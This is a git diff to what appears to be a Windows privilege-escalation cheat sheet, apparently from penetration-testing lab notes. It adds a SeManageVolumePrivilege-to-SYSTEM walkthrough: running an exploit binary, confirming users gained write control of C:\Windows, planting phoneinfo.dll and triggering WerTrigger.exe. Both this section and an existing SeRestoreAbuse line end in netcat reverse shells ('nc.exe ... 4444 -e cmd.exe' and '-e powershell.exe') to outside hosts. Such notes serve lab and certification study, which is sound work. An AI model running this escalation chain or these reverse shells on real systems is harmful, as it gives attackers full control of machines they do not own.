@@ -312,6 +312,32 @@ cmd.exe /c sc qc seclogon
 upload nc.exe
 .\SeRestoreAbuse.exe "C:\temp\nc.exe 192.168.49.194 4444 -e powershell.exe"
 ```
+##### SeManageVolumePrivilege to System
+```
+C:\xampp\htdocs\uploads>whoami
+access\svc_mssql
+
+C:\xampp\htdocs\uploads>SeManageVolumeExploit.exe
+Entries changed: 865
+DONE
+
+C:\xampp\htdocs\uploads>icacls C:/Windows
+C:/Windows NT SERVICE\TrustedInstaller:(F)
+           NT SERVICE\TrustedInstaller:(CI)(IO)(F)
+           NT AUTHORITY\SYSTEM:(M)
+           NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)
+           BUILTIN\Users:(M)
+           BUILTIN\Users:(OI)(CI)(IO)(F)
+
+To set it up we need to:
+
+1. Copy **phoneinfo.dll** to **C:\Windows\System32**
+2. Place **Report.wer** file and **WerTrigger.exe** in a same directory.
+3. Run WerTrigger.exe.
+C:\xampp\htdocs\uploads\enox>WerTrigger.exe
+WerTrigger.exe
+c:/xampp/htdocs/uploads/nc.exe 192.168.118.23 4444 -e cmd.exe
+```
 ##### PowerUp.ps1
 ```
 Service Enumeration:
